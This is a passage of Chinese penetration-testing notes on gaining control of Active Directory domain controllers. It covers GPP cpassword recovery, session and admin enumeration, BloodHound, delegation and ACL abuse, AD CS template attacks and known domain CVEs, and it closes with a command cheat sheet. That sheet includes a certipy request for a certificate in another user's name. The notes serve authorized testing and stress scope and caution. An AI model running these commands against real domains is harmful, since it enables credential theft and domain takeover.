# 第11章 域控制器服务器权限获取分析

## GPP 密码

- 旧域控 GPP XML 中可能存在 `cpassword`。
- 使用授权域账号读取 SYSVOL，并先用 `findstr /S /I cpassword` 定位。
- 解密后的口令应立即按测试规范处理，不写入公开报告。

## 本地管理员组与会话

- 使用 NetLocalGroupGetMembers / NetSessionEnum 枚举；Server 2019+ 权限要求更严格。
- 目标：找出域管登录过的主机、可管理主机的本地管理员和迭代路径。

## BloodHound

- SharpHound 收集 → Neo4j → BloodHound 分析。
- 数据量大，先确认授权和采集范围。

## 委派

- 非约束委派：服务可获取用户 TGT。
- 约束委派：只能访问指定 SPN；Rubeus s4u 利用的是约束委派路径。
- 基于资源的约束委派：需要修改目标的 `msDS-AllowedToActOnBehalfOfOtherIdentity`。

## ACL 与 AD CS

- GenericAll/GenericWrite/WriteProperty 可能导致密码修改、组成员添加、RBCD。
- AD CS 重点检查证书模板权限、ESC 系列配置和 CA 权限。
- 常见域漏洞：ZeroLogon、noPac、PrintNightmare、CVE-2022-26923。
- 漏洞测试前必须确认补丁级别和业务影响。
## 命令速查

### GPP / 会话

```cmd
findstr /S /I cpassword \\<DC>\sysvol\<DOMAIN>\Policies\*.xml
mscan.exe --Domain <DOMAIN> --Username <USER> --Password <PASSWORD> --Host <TARGET> --LocalGMEnum --Group administrators
mscan.exe --Domain <DOMAIN> --Username <USER> --Password <PASSWORD> --Host <TARGET> --SessionEnum
```

### BloodHound

```cmd
SharpHound.exe --domaincontroller <DC> --domain <DOMAIN> --ldapusername <USER> --ldappassword <PASSWORD>
```

### 委派 / ACL / ADCS

```cmd
AdFind.exe -f "(&(msds-allowedtodelegateto=*))" cn distinguishedName msDS-AllowedToDelegateTo
AdFind.exe -f "(&(msDSAllowedToActOnBehalfOfOtherIdentity=*))" cn distinguishedName msDSAllowedToActOnBehalfOfOtherIdentity -sddl++
dsacls "CN=<USER>,CN=Users,DC=<DOMAIN>,DC=<TLD>"
certipy find -u <USER>@<DOMAIN> -p <PASSWORD> -dc-ip <DC>
certipy req -u <USER>@<DOMAIN> -p <PASSWORD> -dc-ip <DC> -ca <CA> -template <TEMPLATE> -upn <TARGET_USER>@<DOMAIN>
```

### 常见漏洞检索

```text
ZeroLogon       CVE-2020-1472
noPac           CVE-2021-42278 / CVE-2021-42287
PrintNightmare  CVE-2021-1675 / CVE-2021-34527
ADCS 提权       CVE-2022-26923
```

提示：域链利用前先画清账号、机器、委派、ACL 和证书模板关系；不要直接修改生产域对象。
